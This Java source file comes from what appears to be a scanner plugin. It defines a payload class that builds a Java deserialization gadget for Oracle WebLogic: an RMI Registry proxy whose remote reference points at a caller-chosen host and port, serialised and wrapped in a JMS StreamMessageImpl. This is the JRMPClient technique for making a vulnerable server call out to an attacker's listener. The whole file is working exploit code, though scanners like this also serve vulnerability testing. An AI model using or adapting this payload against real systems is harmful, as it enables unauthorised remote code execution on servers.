package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.Host;
import com.gbw.scanner.utils.Serializer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import weblogic.jms.common.StreamMessageImpl;

import java.io.IOException;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class GBWJRMPClient3 implements GBWNoEchoPayload<StreamMessageImpl> {

    public StreamMessageImpl getObject (Host host) throws IOException {

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host.getIp(), host.getPort());
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Object object = Proxy.newProxyInstance(GBWJRMPClient3.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        return streamMessageImpl(Serializer.serialize(object));
    }

    @Override
    public String getName() {
        return "GBWJRMPClient3";
    }

    public StreamMessageImpl streamMessageImpl(byte[] object) throws IOException{

        StreamMessageImpl streamMessage = new StreamMessageImpl();
        //streamMessage.writeBytes(object,0,object.length);
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

}
